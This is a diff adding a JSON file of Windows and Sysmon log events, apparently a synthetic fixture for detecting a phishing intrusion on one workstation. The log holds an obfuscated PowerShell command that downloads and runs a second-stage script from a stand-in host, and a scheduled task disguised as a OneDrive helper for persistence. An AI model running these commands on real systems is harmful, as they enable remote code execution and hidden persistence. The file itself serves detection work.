@@ -1,0 +1,72 @@
+[
+ {
+  "@timestamp": "2026-11-03T08:12:00.000Z",
+  "Channel": "Security",
+  "EventID": 4624,
+  "Computer": "WS-0423",
+  "TargetUserName": "priya.n",
+  "IpAddress": "10.0.4.23",
+  "LogonType": 2
+ },
+ {
+  "@timestamp": "2026-11-03T09:02:00.000Z",
+  "Channel": "Microsoft-Windows-Sysmon/Operational",
+  "EventID": 1,
+  "Computer": "WS-0423",
+  "User": "priya.n",
+  "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
+  "CommandLine": "\"OUTLOOK.EXE\"",
+  "ParentImage": "C:\\Windows\\explorer.exe"
+ },
+ {
+  "@timestamp": "2026-11-03T09:20:25.000Z",
+  "Channel": "Microsoft-Windows-Sysmon/Operational",
+  "EventID": 1,
+  "Computer": "WS-0423",
+  "User": "priya.n",
+  "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+  "CommandLine": "\"chrome.exe\" http://paypa1-secure-login.example/account/verify?id=8842",
+  "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"
+ },
+ {
+  "@timestamp": "2026-11-03T09:22:00.000Z",
+  "Channel": "Microsoft-Windows-Sysmon/Operational",
+  "EventID": 1,
+  "Computer": "WS-0423",
+  "User": "priya.n",
+  "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+  "CommandLine": "powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA2ADYAOgA4ADAAOAAxAC8AcwB0AGEAZwBlADIALgBwAHMAMQAnACkA",
+  "ParentImage": "C:\\Users\\priya.n\\Downloads\\Invoice_8842.pdf.exe"
+ },
+ {
+  "@timestamp": "2026-11-03T09:22:04.000Z",
+  "Channel": "Microsoft-Windows-Sysmon/Operational",
+  "EventID": 3,
+  "Computer": "WS-0423",
+  "User": "priya.n",
+  "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+  "SourceIp": "10.0.4.23",
+  "DestinationIp": "203.0.113.66",
+  "DestinationPort": 8081
+ },
+ {
+  "@timestamp": "2026-11-03T09:22:40.000Z",
+  "Channel": "Microsoft-Windows-Sysmon/Operational",
+  "EventID": 1,
+  "Computer": "WS-0423",
+  "User": "priya.n",
+  "Image": "C:\\Windows\\System32\\schtasks.exe",
+  "CommandLine": "schtasks.exe /create /tn \"OneDrive Sync Helper\" /tr \"powershell -w hidden -file C:\\Users\\Public\\sync.ps1\" /sc minute /mo 5",
+  "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+ },
+ {
+  "@timestamp": "2026-11-03T09:52:00.000Z",
+  "Channel": "Microsoft-Windows-Sysmon/Operational",
+  "EventID": 1,
+  "Computer": "WS-0431",
+  "User": "arun.k",
+  "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+  "CommandLine": "powershell.exe -File C:\\Scripts\\inventory.ps1",
+  "ParentImage": "C:\\Windows\\explorer.exe"
+ }
+]
